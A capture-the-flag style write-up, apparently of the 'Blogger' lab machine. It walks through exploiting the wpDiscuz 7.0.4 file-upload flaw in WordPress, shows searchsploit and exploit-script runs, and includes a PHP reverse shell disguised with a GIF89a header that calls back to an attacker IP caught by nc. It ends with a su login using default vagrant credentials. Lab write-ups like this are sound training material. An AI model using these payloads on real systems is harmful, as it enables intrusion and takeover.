Upon exploring the assets directory, we find that the fonts directory inside it has a blog directory, which leads us to a whole new WordPress site. However, the site appears somewhat broken and the internal links make references to "blogger.pg"

```shell
sudo echo "192.168.182.217 blogger.pg" >> /etc/hosts
```

![](png/blogger_whole_new_site.png)

This calls for a wpscan

```shell
wpscan --url http://blogger.pg/assets/fonts/blog/ --plugins-detection aggressive

Don't worry, that took just 32 minutes and 27 seconds.

Nevertheless, a vulnerable plugin, which was seemingly elusive from normal usage of wpscan, was found.
## Exploitation

```shell
searchsploit wpdiscuz
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path

Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)          | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)          | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploi | php/webapps/49401.rb
----------------------------------------------------------------------------------- ---------------------------------
```

Seems we already have the exploit with us. And the version perfectly matches. But lets read more about it. 

https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-comments-wpdiscuz-arbitrary-file-upload-7-0-4/

Seems like an Arbitrary File Upload in this plugin's "comments" feature.

```shell
cp /usr/share/exploitdb/exploits/php/webapps/49967.py .
```

```shell
$ python 49967.py 
[+] Specify an url target
[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost
[+] Example help usage: exploit.py -h
```

We will require an existing blog post to abuse this feature. We will use http://blogger.pg/assets/fonts/blog/?p=27.

```shell
$ python 49967.py -u http://blogger.pg/assets/fonts/blog -p /?p=27

```

The exploit worked, but the shell was having issues. We can manually go to the php shell using the link.

I found another exploit: [GitHub - meicookies/CVE-2020-24186: WpDiscuz 7.0.4 Arbitrary File Upload Exploit](https://github.com/meicookies/CVE-2020-24186) since I wasn't unable to run anything beyond basic commands.

Basically, put any php code (I used `php-reverse-shell.php`) but give it the file header "GIF89a", like so

```php
GIF89a
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.45.169';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
<...>
```

And upload it in the comment section...

![](png/blogger_upload_here.png)

To catch a reverse shell

```shell
$ nc -vlnp 4444
listening on [any] 4444 ...

linpeas broke before trying to bruteforce using su. We can `su`as `vagrant` with the password `vagrant`.
